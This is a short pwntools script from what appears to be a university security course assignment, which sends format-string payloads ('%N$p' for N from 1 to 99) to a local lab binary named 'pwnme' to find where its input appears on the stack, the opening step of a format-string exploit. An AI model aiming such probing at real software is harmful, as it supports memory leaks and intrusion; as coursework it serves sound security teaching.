'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP18: Vuln
File Description:  Used to find where prinf locatoin starts within binary of "pwnme"
'''

#   Import Libraries
from pwn import *

# Start process
p=process("./pwnme")

# For range loop to print strings
for i in range(1,100):
    payload = b'%'+str(i).encode()+b'$p'
    p.sendline(payload)
    print(p.recvline())

# Stop process
p.close()